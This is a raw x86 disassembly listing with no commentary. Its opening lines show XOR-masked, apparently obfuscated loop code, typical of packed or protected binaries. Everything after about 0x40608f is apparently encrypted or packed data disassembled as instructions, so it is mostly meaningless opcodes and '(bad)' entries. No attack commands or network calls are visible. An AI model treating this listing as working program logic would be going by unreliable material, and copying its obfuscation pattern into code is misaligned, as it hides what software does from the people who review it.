  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0x33a0f463
  40609c:	aas    
  40609d:	imul   ecx,DWORD PTR [esi+esi*4+0x3c],0x62
  4060a2:	bound  ebx,QWORD PTR [edi+ebx*2]
  4060a5:	bound  esp,QWORD PTR [edx+0x10]
  4060a8:	std    
  4060a9:	jmp    0x4060bf
  4060ab:	ins    BYTE PTR es:[edi],dx
  4060ac:	push   0xffffffc1
  4060ae:	dec    ebp
  4060af:	pop    esi
  4060b0:	scas   al,BYTE PTR es:[edi]
  4060b1:	scas   eax,DWORD PTR es:[edi]
  4060b2:	cmp    eax,0xee46aa52
  4060b7:	xor    edx,DWORD PTR [esi+0x11]
  4060ba:	addr16 mov al,ds:0x7e7b
  4060be:	call   0x3e40:0x5d360b63
  4060c5:	pop    esp
  4060c6:	(bad)  
  4060c7:	iret   
  4060c8:	test   ebp,esi
  4060ca:	push   ds
  4060cb:	fidiv  DWORD PTR [ecx]
  4060cd:	push   cs
  4060ce:	data16 repnz (bad) 
  4060d1:	fimul  WORD PTR [ecx-0x57119c99]
  4060d7:	mov    DWORD PTR [ecx-0x47],esp
  4060da:	push   esi
  4060db:	data16 jg 0x4060d7
  4060de:	test   eax,0x7b079520
  4060e3:	aam    0x91
  4060e5:	cmp    eax,DWORD PTR [ecx+0x371fe9b7]
  4060eb:	scas   al,BYTE PTR es:[edi]
  4060ec:	inc    esp
  4060ed:	(bad)  
  4060ee:	pusha  
  4060ef:	es dec eax
  4060f1:	push   0x51
  4060f3:	int3   
  4060f4:	mov    al,0xf2
  4060f6:	or     al,0x51
  4060f8:	aam    0x5a
  4060fa:	pop    ecx
  4060fb:	jmp    0x406093
  4060fd:	cmp    edi,ecx
  4060ff:	ret    
  406100:	loope  0x406141
  406102:	or     al,0xe2
  406104:	jns    0x406093
  406106:	loop   0x406133
  406108:	push   edx
  406109:	or     BYTE PTR [ecx-0x45],0xf3
  40610d:	repnz and al,0xa2
  406110:	ret    0xaf7e
  406113:	hlt    
  406114:	mov    cl,0x3b
  406116:	xor    edx,eax
  406118:	paddb  mm2,QWORD PTR ds:0x47292c8e
  40611f:	leave  
  406120:	enter  0x7aaa,0x71
  406124:	(bad)  
  406125:	out    0x98,eax
  406127:	sbb    BYTE PTR [edi+0x4899ed5d],0x59
  40612e:	jecxz  0x4061a9
  406130:	xor    ch,bl
  406132:	rcl    DWORD PTR [ecx+0x19dbb85f],cl
  406138:	(bad)  
  406139:	in     al,dx
  40613a:	or     bl,BYTE PTR [ebp-0x186ee543]
  406140:	(bad)  
  406141:	fsubp  st(6),st
  406143:	sahf   
  406144:	cli    
  406145:	hlt    
  406146:	pop    edx
  406147:	and    BYTE PTR [esi],0xa1
  40614a:	add    bh,BYTE PTR [edi+0x854493e]
  406150:	add    al,dh
  406152:	test   BYTE PTR [ecx-0x4eff45ee],al
  406158:	mov    cl,0x63
  40615a:	adc    eax,0x423e7cc0
  40615f:	xlat   BYTE PTR ds:[ebx]
  406160:	fisttp QWORD PTR [ecx+0x5a]
  406163:	xchg   ecx,eax
  406164:	dec    esi
  406165:	jle    0x4061a1
  406167:	gs pop ss
  406169:	aaa    
  40616a:	cmc    
  40616b:	shl    BYTE PTR [edi-0x688b6e52],1
  406171:	pop    ecx
  406172:	test   ebp,edx
  406174:	shr    BYTE PTR [edi+0x75],cl
  406177:	out    0x6a,eax
  406179:	add    DWORD PTR [ecx+0x5093dc3c],esp
  40617f:	add    al,0x2e
  406181:	dec    edx
  406182:	aam    0xa9
  406184:	test   eax,0xa75901df
  406189:	jle    0x4061ae
  40618b:	fnstcw WORD PTR [eax]
  40618d:	test   ebx,0xe9771d0d
  406193:	cli    
  406194:	add    ebx,DWORD PTR [edx+ebx*1-0x41]
  406198:	or     al,0x5
  40619a:	pop    ebp
  40619b:	aad    0x25
  40619d:	pop    edi
  40619e:	and    BYTE PTR [esi+0x33],dh
  4061a1:	dec    esp
  4061a2:	jge    0x4061a7
  4061a4:	sbb    bh,cl
  4061a6:	and    esp,DWORD PTR [ebp+0x56549b45]
  4061ac:	cdq    
  4061ad:	scas   eax,DWORD PTR es:[edi]
  4061ae:	jo     0x406131
  4061b0:	dec    edi
  4061b1:	xchg   edx,eax
  4061b2:	retf   0xe138
  4061b5:	sub    dh,BYTE PTR [ebx-0x7a]
  4061b8:	inc    esp
  4061b9:	jl     0x406225
  4061bb:	push   ebx
  4061bc:	lods   al,BYTE PTR ds:[esi]
  4061bd:	adc    ebx,0x26
  4061c0:	enter  0xe52a,0x76
  4061c4:	setbe  BYTE PTR [ebp-0x2801162d]
  4061cb:	mov    WORD PTR [edx+edx*8+0xe],?
  4061cf:	ja     0x406215
  4061d1:	jg     0x40615f
  4061d3:	aad    0x24
  4061d5:	push   eax
  4061d6:	adc    ecx,DWORD PTR [edi+esi*8+0x5c9bb06]
  4061dd:	test   ah,al
  4061df:	aas    
  4061e0:	cmp    BYTE PTR [edx-0x78],bh
  4061e3:	push   ebx
  4061e4:	pop    ebx
  4061e5:	cmc    
  4061e6:	mul    dh
  4061e8:	or     eax,0xfdb6cecf
  4061ed:	adc    eax,0x970313dc
  4061f2:	out    dx,al
  4061f3:	int    0x12
  4061f5:	mov    ds:0xba2666db,eax
  4061fa:	dec    esp
  4061fb:	mov    esp,es
  4061fd:	inc    eax
  4061fe:	in     al,dx
  4061ff:	cmc    
  406200:	mov    esp,0x5f93789c
  406205:	xchg   esp,eax
  406206:	mov    eax,0x78381773
  40620b:	jp     0x4061c0
  40620d:	clc    
  40620e:	loope  0x40626c
  406210:	xchg   edx,eax
  406211:	stos   DWORD PTR es:[edi],eax
  406212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406213:	push   eax
  406214:	push   edi
  406215:	out    dx,eax
  406216:	jnp    0x40623a
  406218:	mov    BYTE PTR [ebx],al
  40621a:	(bad)  
  40621b:	in     eax,0x7f
  40621d:	test   BYTE PTR [edi],bl
  40621f:	or     bl,ch
  406221:	push   es
  406222:	or     edx,DWORD PTR [ebx+0x84c73f2]
  406228:	add    BYTE PTR [ebx+ecx*8],ah
  40622b:	or     al,0xba
  40622d:	add    dl,BYTE PTR [ecx+0x16]
  406230:	hlt    
  406231:	mov    esp,0xc45ca654
  406236:	outs   dx,BYTE PTR ds:[esi]
  406237:	or     al,0x22
  40623a:	sub    al,0xb6
  40623c:	aas    
  40623d:	pop    esp
  40623e:	cmp    ecx,DWORD PTR [ebp+0xa94a2c9]
  406244:	push   eax
  406245:	xchg   esi,eax
  406246:	cmp    DWORD PTR ds:0xcc9dd181,ebx
  40624c:	xchg   edx,eax
  40624d:	mov    cl,0xe0
  40624f:	mov    esi,0x96af5fac
  406254:	ss cvtpi2ps xmm2,mm3
  406258:	lahf   
  406259:	punpckldq mm0,mm4
  40625c:	pop    ecx
  40625d:	xor    ebx,DWORD PTR [ebx]
  40625f:	mov    ebp,0xa7eb779f
  406264:	aad    0x56
  406266:	ret    0xe2b9
  406269:	and    ebx,DWORD PTR [edi+0x67c6ec37]
  40626f:	scas   al,BYTE PTR es:[edi]
  406270:	jo     0x4062d9
  406272:	cdq    
  406273:	(bad)  
  406274:	mov    ah,0x98
  406276:	in     al,dx
  406277:	xor    esp,esp
  406279:	mov    dl,0x8e
  40627b:	fcmovnb st,st(2)
  40627d:	inc    ebx
  40627e:	xchg   ecx,eax
  40627f:	outs   dx,DWORD PTR ds:[esi]
  406280:	mov    eax,ds:0x9e350103
  406285:	pop    es
  406286:	sbb    al,0xa5
  406288:	fwait
  406289:	sbb    BYTE PTR [edi-0xa],cl
  40628c:	add    BYTE PTR [esp+eax*1+0x2e76b005],0x89
  406294:	xlat   BYTE PTR ds:[ebx]
  406295:	fiadd  DWORD PTR [eax-0x65af7d35]
  40629b:	push   ss
  40629c:	pop    ss
  40629d:	mov    esi,0xa0582269
  4062a2:	dec    ecx
  4062a3:	aas    
  4062a4:	or     edx,ebx
  4062a6:	xor    BYTE PTR [edx+0x74],ch
  4062a9:	jl     0x406304
  4062ab:	pop    eax
  4062ac:	xchg   edx,eax
  4062ad:	mov    dl,0x9f
  4062af:	mov    al,0x5b
  4062b1:	rcr    DWORD PTR [eax],cl
  4062b3:	pusha  
  4062b4:	sub    ecx,DWORD PTR [edi-0x1a383b42]
  4062ba:	add    bl,cl
  4062bc:	lods   al,BYTE PTR ds:[esi]
  4062bd:	loopne 0x406247
  4062bf:	jae    0x4062d9
  4062c1:	stc    
  4062c2:	out    dx,al
  4062c3:	(bad)
  4062c6:	pop    ebx
  4062c7:	je     0x40629e
  4062c9:	sub    dl,BYTE PTR [eax]
  4062cb:	shl    BYTE PTR [edx],0xe7
  4062ce:	cdq    
  4062cf:	out    0x80,eax
  4062d1:	fcomi  st,st(5)
  4062d3:	and    eax,0xc7cbad0d
  4062d8:	std    
  4062d9:	ror    DWORD PTR [eax+0x17fa6cd4],cl
  4062df:	loop   0x40631e
  4062e1:	adc    bl,BYTE PTR [esi+0x728b706e]
  4062e7:	dec    edx
  4062e8:	add    edi,ecx
  4062ea:	not    BYTE PTR [edx+0x6c]
  4062ed:	daa    
  4062ee:	mov    esp,0xf9d6e350
  4062f3:	shr    DWORD PTR [ebp-0x727f4748],cl
  4062f9:	mov    esi,DWORD PTR [edx-0x44]
  4062fc:	(bad)  
  4062fe:	les    esi,FWORD PTR [edx-0x4b898b70]
  406304:	sub    ecx,DWORD PTR [ebx]
  406306:	and    al,0x9f
  406308:	mov    edi,0xe925396e
  40630d:	in     eax,0x3d
  40630f:	clc    
  406310:	aam    0x7b
  406312:	(bad)  
  406313:	outs   dx,BYTE PTR ds:[esi]
  406314:	xor    edi,eax
  406316:	jae    0x4062f4
  406318:	pop    esi
  406319:	js     0x4062f9
  40631b:	lea    ebx,cs:[edx-0xb29f31d]
  406322:	add    DWORD PTR [ecx+0x62],eax
  406325:	cli    
  406326:	xchg   ebp,eax
  406327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406328:	icebp  
  406329:	xchg   ecx,eax
  40632a:	mov    bh,0x90
  40632c:	xchg   DWORD PTR [bp+di-0x66],edx
  406330:	out    dx,eax
  406331:	inc    ecx
  406332:	push   ebx
  406333:	out    dx,eax
  406334:	pusha  
  406335:	push   ds
  406336:	mov    edi,0x5d61c7a1
  40633b:	or     edi,DWORD PTR [esi+0x7ae72c7c]
  406341:	ss mov ebp,0x31844366
  406347:	daa    
  406348:	scas   al,BYTE PTR es:[edi]
  406349:	iret   
  40634a:	fs inc eax
  40634c:	sbb    DWORD PTR [eax+0x2c],0x47
  406350:	hlt    
  406351:	pop    es
  406352:	cmc    
  406353:	fwait
  406354:	mov    eax,ds:0xa0129f05
  406359:	xchg   ecx,eax
  40635a:	shl    edx,0xd9
  40635d:	and    eax,0xcb87113d
  406362:	in     eax,dx
  406363:	rsqrtps xmm7,XMMWORD PTR [ecx+0x5e46c295]
  40636a:	mov    eax,ds:0x1847139a
  40636f:	dec    ecx
  406370:	xchg   esp,eax
  406371:	aas    
  406372:	adc    dl,BYTE PTR [eax+0x10]
  406375:	fstp   DWORD PTR [ebp+0x6e0897e1]
  40637b:	mov    cl,BYTE PTR [edi]
  40637d:	fisttp DWORD PTR [edx+0x2e]
  406380:	popa   
  406381:	xchg   esp,edx
  406383:	xor    al,0xf2
  406385:	sub    DWORD PTR [esi+ebx*4-0x2cec2bc0],ecx
  40638c:	cld    
  40638d:	fild   DWORD PTR [edi]
  40638f:	pop    ss
  406390:	retf   0x39bf
  406393:	inc    edi
  406394:	fisub  WORD PTR [edx+0x39]
  406397:	imul   DWORD PTR [edi+0x39]
  40639a:	mov    ecx,0x82b9e36d
  40639f:	jecxz  0x40637b
  4063a1:	or     bh,BYTE PTR [edi]
  4063a3:	lods   eax,DWORD PTR ds:[esi]
  4063a4:	mov    ds:0x9f201027,al
  4063a9:	icebp  
  4063aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ab:	or     DWORD PTR [edx-0x2f3e494e],edi
  4063b1:	stc    
  4063b2:	pop    ss
  4063b3:	sahf   
  4063b4:	xor    cl,dh
  4063b6:	shl    BYTE PTR [esi+0x1],1
  4063b9:	inc    ebx
  4063ba:	sbb    DWORD PTR [ecx],ebp
  4063bc:	inc    ecx
  4063bd:	repnz cwde 
  4063bf:	stos   DWORD PTR es:[edi],eax
  4063c0:	sbb    edi,DWORD PTR [eax+ebx*8-0x3e]
  4063c4:	(bad)  [ecx]
  4063c6:	pusha  
  4063c7:	dec    ecx
  4063c8:	jo     0x4063bc
  4063ca:	nop
  4063cb:	pop    eax
  4063cc:	imul   BYTE PTR [ebx+0x5e86661d]
  4063d2:	repz imul BYTE PTR [edi+esi*4]
  4063d6:	(bad)  
  4063d7:	popf   
  4063d8:	xchg   edx,eax
  4063d9:	and    esp,DWORD PTR [ebx+0x4ed02cce]
  4063df:	inc    esi
  4063e0:	adc    al,0x9d
  4063e2:	sbb    dl,bl
  4063e4:	gs mov cl,cl
  4063e7:	jb     0x40640c
  4063e9:	xchg   DWORD PTR [eax],edi
  4063eb:	cli    
  4063ec:	pop    ecx
  4063ed:	ins    DWORD PTR es:[edi],dx
  4063ee:	sar    BYTE PTR [edi+0x51793056],0x25
  4063f5:	adc    al,0xe5
  4063f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4063f9:	fcmove st,st(5)
  4063fb:	push   0x4409ced1
  406400:	mov    ebp,0x368e343
  406405:	pop    ecx
  406406:	loopne 0x4063f1
  406408:	bound  eax,QWORD PTR [ebp-0x79563056]
  40640e:	in     eax,dx
  40640f:	cmp    al,0xd1
  406411:	mov    dl,0x67
  406413:	leave  
  406414:	sub    eax,0x2b370c2d
  406419:	test   DWORD PTR [eax],0xe6e7c365
  40641f:	out    0x0,eax
  406421:	gs ror ebx,cl
  406424:	jmp    0x406432
  406426:	mov    esi,0xdafe2c65
  40642b:	dec    ecx
  40642c:	dec    ebp
  40642d:	xor    ebx,DWORD PTR [esi+ebx*4+0x51]
  406431:	dec    edx
  406432:	adc    BYTE PTR [eax+0xa],dl
  406435:	xchg   ebx,eax
  406436:	fcomp  QWORD PTR [esi+0x1c01eca7]
  40643c:	push   0x159c0546
  406441:	xchg   ecx,eax
  406442:	es in  al,0xe8
  406445:	sar    dl,cl
  406447:	cli    
  406448:	(bad)  
  406449:	std    
  40644a:	int3   
  40644b:	ins    BYTE PTR es:[edi],dx
  40644c:	cmp    DWORD PTR [edx-0x4f],edx
  40644f:	int3   
  406450:	xor    BYTE PTR [eax-0x165efec],al
  406456:	(bad)  
  406458:	inc    ecx
  406459:	arpl   bx,si
  40645b:	cld    
  40645c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40645d:	add    BYTE PTR [edi-0x127c2f32],bl
  406463:	pop    es
  406464:	jecxz  0x40643e
  406466:	mov    al,0x76
  406468:	jmp    0x4064cd
  40646a:	dec    esi
  40646b:	adc    esi,DWORD PTR [esp+ebp*1]
  40646e:	or     eax,0xae64dbae
  406473:	inc    edx
  406474:	(bad)  
  406475:	sub    ebx,DWORD PTR [ebp-0x5539ef2f]
  40647b:	lock hlt 
  40647d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40647e:	sbb    ch,al
  406480:	sub    BYTE PTR [ebx-0x2febf88b],bl
  406486:	jecxz  0x4064e2
  406488:	mov    ds,WORD PTR [ecx+0x6c]
  40648b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648c:	pop    eax
  40648d:	inc    ebx
  40648e:	mov    fs,WORD PTR [ebx+0x1d3be120]
  406494:	mov    edi,0x1d530b54
  406499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40649a:	pop    esi
  40649b:	sbb    ebp,DWORD PTR [esi+0x3b]
  40649e:	or     edx,DWORD PTR [edx+edx*1]
  4064a1:	xor    dh,BYTE PTR [ebp+0xb]
  4064a4:	and    edi,ecx
  4064a6:	or     BYTE PTR [ebx-0x67],0x36
  4064aa:	jmp    0x406471
  4064ac:	outs   dx,BYTE PTR ds:[esi]
  4064ad:	cmc    
  4064ae:	repz inc ebx
  4064b0:	sub    ebx,DWORD PTR [ecx+0xb00da10]
  4064b6:	mov    ecx,0x8e755be6
  4064bb:	mov    dl,0x7f
  4064bd:	mov    ecx,DWORD PTR [edx]
  4064bf:	jae    0x4064a3
  4064c1:	js     0x406482
  4064c3:	pop    esp
  4064c4:	std    
  4064c5:	aad    0x1e
  4064c7:	loop   0x40648a
  4064c9:	retf   0x47a
  4064cc:	dec    esi
  4064cd:	lock or BYTE PTR [edi+0x42],bh
  4064d1:	mov    ecx,0x60cbf814
  4064d6:	bnd jae 0x4064b7
  4064d9:	mov    ah,0x68
  4064db:	cli    
  4064dc:	mov    ebx,0xe9ef3d79
  4064e1:	into   
  4064e2:	mov    edi,0x51c9b086
  4064e7:	fadd   st,st(2)
  4064e9:	mov    WORD PTR [ebx+0x46c72773],ds
  4064ef:	mov    esi,0xb07cf574
  4064f4:	inc    ebx
  4064f5:	cmp    al,0xa6
  4064f7:	pop    ss
  4064f8:	cmp    al,0x58
  4064fa:	adc    DWORD PTR [ebx],edi
  4064fc:	pop    ebp
  4064fd:	mov    ah,0x2a
  4064ff:	sahf   
  406500:	sahf   
  406501:	inc    edx
  406502:	push   ebx
  406503:	push   ebp
  406504:	inc    edi
  406505:	lods   al,BYTE PTR ds:[esi]
  406506:	push   ss
  406507:	daa    
  406508:	iret   
  406509:	jl     0x4064c5
  40650b:	jno    0x4064f3
  40650d:	not    BYTE PTR [edx-0x75]
  406510:	icebp  
  406511:	adc    dh,BYTE PTR [ecx+0x2d]
  406514:	aad    0x9a
  406516:	push   esp
  406517:	jnp    0x40658d
  406519:	scas   al,BYTE PTR es:[edi]
  40651a:	mov    ebx,0x86e7bb54
  40651f:	sbb    BYTE PTR [edi+0x4f],0x6f
  406523:	pop    ds
  406524:	add    dh,BYTE PTR [edx]
  406526:	push   0xc187c380
  40652b:	sbb    eax,0x60ced894
  406530:	cmp    DWORD PTR [eax+ebx*1-0x4788c43b],ebx
  406537:	push   ds
  406538:	xor    dl,BYTE PTR [ecx+0x4c]
  40653b:	pop    esp
  40653c:	jl     0x406580
  40653e:	mov    dl,0xbc
  406540:	adc    BYTE PTR ds:0xdd171953,0xee
  406547:	rcl    BYTE PTR [ebx+edx*2],cl
  40654a:	push   esi
  40654b:	mov    WORD PTR [edi-0x8],?
  40654e:	push   esi
  40654f:	adc    ebx,DWORD PTR fs:[ecx]
  406552:	bndstx [ecx-0x5a],bnd1
  406556:	pop    edi
  406557:	ffreep st(6)
  406559:	cdq    
  40655a:	out    0x70,eax
  40655c:	arpl   WORD PTR [eax+ebx*8-0x38ad782e],bp
  406563:	icebp  
  406564:	ins    DWORD PTR es:[edi],dx
  406565:	push   ds
  406566:	push   ebx
  406567:	add    eax,0xe5e67679
  40656c:	dec    esp
  40656d:	add    BYTE PTR [esi],dh
  40656f:	rol    BYTE PTR [esi-0x5eb326c8],cl
  406575:	inc    BYTE PTR [edi-0x3d703197]
  40657b:	enter  0xc64b,0xd2
  40657f:	int3   
  406580:	ins    DWORD PTR es:[edi],dx
  406581:	fwait
  406582:	adc    eax,0xf3af19c2
  406587:	or     eax,DWORD PTR [esp+ecx*8]
  40658a:	sbb    al,al
  40658c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658d:	push   esp
  40658e:	aaa    
  40658f:	gs js  0x4065b0
  406592:	pop    esi
  406593:	add    al,0x28
  406595:	enter  0xe69,0x3b
  406599:	daa    
  40659a:	leave  
  40659b:	loopne 0x406603
  40659d:	jg     0x40652f
  40659f:	shl    BYTE PTR [edi],0x73
  4065a2:	(bad)  
  4065a3:	ja     0x406563
  4065a5:	pop    ebx
  4065a6:	hlt    
  4065a7:	cld    
  4065a8:	push   ds
  4065a9:	call   0xf6ac:0xd6a808e6
  4065b0:	mov    eax,ds:0x92d3632e
  4065b5:	xor    DWORD PTR [ebp+0x5],edi
  4065b8:	retf   
  4065b9:	sbb    al,0x1e
  4065bb:	inc    esp
  4065bc:	nop
  4065bd:	adc    BYTE PTR [eax-0x26],dh
  4065c0:	push   es
  4065c1:	and    bh,BYTE PTR [eax+edi*2+0x40]
  4065c5:	adc    DWORD PTR [ecx],ebx
  4065c7:	inc    esi
  4065c8:	or     al,0x1d
  4065ca:	cli    
  4065cb:	xchg   ebp,eax
  4065cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065cd:	shl    edi,cl
  4065cf:	push   edi
  4065d0:	lock hlt 
  4065d2:	add    ch,ah
  4065d4:	inc    esi
  4065d5:	dec    esp
  4065d6:	pusha  
  4065d7:	aaa    
  4065d8:	mov    esi,edx
  4065da:	aad    0x55
  4065dc:	wrmsr  
  4065de:	sbb    eax,0x69ce341
  4065e3:	clc    
  4065e4:	sub    cl,BYTE PTR [ecx+0x1a]
  4065e7:	sub    BYTE PTR gs:[ebx],0xb3
  4065eb:	pop    edi
  4065ec:	sbb    ebp,ebp
  4065ee:	fcmove st,st(4)
  4065f0:	or     DWORD PTR [esi],edx
  4065f2:	xchg   edx,eax
  4065f3:	jnp    0x4065c6
  4065f5:	dec    edx
  4065f6:	add    DWORD PTR [edx+ebx*1-0x7c12b427],ecx
  4065fd:	mov    al,ds:0x6212a0c9
  406602:	jmp    0x1887:0xace5d240
  406609:	ret    0xb1e5
  40660c:	adc    al,0xf3
  40660e:	mov    ebx,0x2c9c9d1f
  406613:	(bad)  
  406614:	(bad)  
  406615:	sti    
  406616:	pop    ds
  406617:	shl    dh,cl
  406619:	adc    dl,ch
  40661b:	fdivr  DWORD PTR [ecx+0x13f8e2bc]
  406621:	outs   dx,BYTE PTR ds:[esi]
  406622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406623:	fs jo  0x40660d
  406626:	mov    edi,0x4e1a920e
  40662b:	rcl    ecx,1
  40662d:	sub    BYTE PTR ds:0x3e0349a6,ch
  406633:	fadd   QWORD PTR ds:0x7e93ab4e
  406639:	adc    eax,0x284a0559
  40663e:	hlt    
  40663f:	cld    
  406640:	mov    ecx,0xe408f199
  406645:	and    eax,0x56d34c23
  40664a:	ret    0xdb01
  40664d:	dec    edx
  40664e:	mov    al,0x31
  406650:	loop   0x4066c2
  406652:	fwait
  406653:	xchg   edx,eax
  406654:	inc    esp
  406655:	mov    ds:0x89ba2899,al
  40665a:	test   BYTE PTR [ebx],ah
  40665c:	jo     0x4066bf
  40665e:	push   es
  40665f:	mov    ah,0xd4
  406661:	dec    eax
  406662:	test   DWORD PTR fs:[edx+0x476574f6],ecx
  406669:	stos   BYTE PTR es:[edi],al
  40666a:	and    eax,0x86f76aa2
  40666f:	ins    BYTE PTR es:[edi],dx
  406670:	fistp  DWORD PTR [esi+0x2f7cee07]
  406676:	fdivr  st(3),st
  406678:	gs and ch,BYTE PTR gs:[ecx]
  40667c:	mov    BYTE PTR [ecx],ah
  40667e:	retf   
  40667f:	xchg   edi,eax
  406680:	repz or al,0x5a
  406683:	in     eax,dx
  406684:	mov    ch,0xb2
  406686:	jle    0x40664f
  406688:	jge    0x406688
  40668a:	xor    ch,BYTE PTR [ecx]
  40668c:	add    esp,esp
  40668e:	(bad)  
  40668f:	adc    al,0x20
  406691:	(bad)  
  406692:	fld    QWORD PTR ds:0xa281d10
  406698:	repz aas 
  40669a:	lods   al,BYTE PTR ds:[esi]
  40669b:	push   ecx
  40669c:	add    eax,0xc72f1245
  4066a1:	ss sbb eax,0xcf404129
  4066a7:	retf   
  4066a8:	mov    al,ds:0x932f0edd
  4066ad:	and    BYTE PTR [eax],0xdd
  4066b0:	mov    bh,0xae
  4066b2:	dec    esi
  4066b3:	pop    ds
  4066b4:	out    dx,eax
  4066b5:	inc    esi
  4066b6:	jmp    0x2922:0x264bab5c
  4066bd:	sbb    edi,DWORD PTR [edx]
  4066bf:	cwde   
  4066c0:	call   0xe904dd10
  4066c5:	cmp    esp,DWORD PTR [edi+0x39a5e67d]
  4066cb:	rcl    BYTE PTR [ebp-0x21],cl
  4066ce:	sub    bl,0x5f
  4066d1:	xchg   DWORD PTR [eax],ebx
  4066d3:	mov    esi,0x6127819a
  4066d8:	mov    ecx,0x695544c2
  4066dd:	and    edi,esi
  4066df:	lea    ebp,[ecx+0x9aafa1c]
  4066e5:	cmp    cl,dl
  4066e7:	cli    
  4066e8:	call   0x7e3724b
  4066ed:	push   esp
  4066ee:	cli    
  4066ef:	aaa    
  4066f0:	pop    ecx
  4066f1:	dec    ecx
  4066f2:	addr16 mov esi,0x99078318
  4066f8:	jnp    0x4066a6
  4066fa:	push   ecx
  4066fb:	and    eax,0xae33a11c
  406700:	test   DWORD PTR [ecx],esi
  406702:	repnz xchg ecx,eax
  406704:	xchg   ecx,eax
  406705:	dec    esi
  406706:	push   ds
  406707:	in     al,0xeb
  406709:	ds jno 0x406712
  40670c:	mov    edi,es
  40670e:	pop    es
  40670f:	mov    dh,0x59
  406711:	jp     0x4066a1
  406713:	addr16 pop edi
  406715:	frstor [eax]
  406717:	push   esi
  406718:	into   
  406719:	pop    esi
  40671a:	in     eax,dx
  40671b:	mov    ds:0xc782acac,al
  406720:	hlt    
  406721:	add    BYTE PTR [ebx+0x79ff3aad],ch
  406727:	cli    
  406728:	ror    BYTE PTR [ecx],cl
  40672a:	test   DWORD PTR [eax-0x66],edx
  40672d:	inc    edx
  40672e:	imul   edx,DWORD PTR [ebp+0x7a],0xf
  406732:	pop    ss
  406733:	hlt    
  406734:	aas    
  406735:	jecxz  0x40675d
  406737:	popf   
  406738:	outs   dx,BYTE PTR ds:[esi]
  406739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40673a:	or     DWORD PTR [ecx+eiz*8],ebx
  40673d:	leave  
  40673e:	pusha  
  40673f:	test   al,0x77
  406741:	fst    QWORD PTR [esi+0x135470a1]
  406747:	mov    ebx,0xd2eb58a0
  40674c:	jo     0x4066d4
  40674e:	repnz int3 
  406750:	xchg   edx,eax
  406751:	test   al,0x78
  406753:	xor    DWORD PTR ds:0xaff45a20,edi
  406759:	cmp    al,0xd6
  40675b:	mov    DWORD PTR [edx],0x70e977a1
  406761:	daa    
  406762:	in     al,0xb1
  406764:	pop    edi
  406765:	outs   dx,BYTE PTR ds:[esi]
  406766:	imul   esi,DWORD PTR [edi+eiz*8-0x3de138bc],0xffffffa4
  40676e:	jno    0x406741
  406770:	hlt    
  406771:	mov    DWORD PTR [esi+edx*4+0x1cae34ba],ecx
  406778:	pop    es
  406779:	adc    eax,0x3b24cd08
  40677e:	mov    BYTE PTR [edi+0x1d],0xdf
  406782:	mov    ah,0xcf
  406784:	dec    edi
  406785:	mov    ds,esp
  406787:	and    eax,0x78896969
  40678c:	das    
  40678d:	and    DWORD PTR [eax],esi
  40678f:	outs   dx,BYTE PTR ds:[esi]
  406790:	cmp    BYTE PTR [ebx-0x6f],dl
  406793:	mov    ecx,0xe72175a1
  406798:	cs daa 
  40679a:	icebp  
  40679b:	add    DWORD PTR [edi+0x14],ebp
  40679e:	sub    eax,0x8b088e01
  4067a3:	add    eax,0xfbdb8f4a
  4067a8:	jnp    0x4067c5
  4067aa:	out    dx,eax
  4067ab:	das    
  4067ac:	push   eax
  4067ad:	in     al,0xc
  4067af:	dec    ebp
  4067b0:	push   es
  4067b1:	and    DWORD PTR [ecx+esi*8+0xd766896],0xc0cbef68
  4067bc:	jmp    0x89bd:0xbf9bf211
  4067c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c4:	jecxz  0x4067bd
  4067c6:	out    0x82,eax
  4067c8:	outs   dx,DWORD PTR ds:[esi]
  4067c9:	xchg   esi,eax
  4067ca:	dec    esp
  4067cb:	pop    eax
  4067cc:	pop    ecx
  4067cd:	frstpm(287 only) 
  4067cf:	bound  ebx,QWORD PTR [eax-0x2]
  4067d2:	rcl    DWORD PTR [eax+0x7f],1
  4067d5:	sub    ecx,DWORD PTR [eax-0x13f11095]
  4067db:	test   DWORD PTR [ecx-0x2151e8b3],ecx
  4067e1:	mov    dh,BYTE PTR [ecx+0x5600bcdd]
  4067e7:	fs (bad) 
  4067e9:	add    ebp,DWORD PTR ss:[edx]
  4067ec:	leave  
  4067ed:	jb     0x406793
  4067ef:	stos   BYTE PTR es:[edi],al
  4067f0:	sbb    eax,0xbab67f96
  4067f5:	jle    0x4067c1
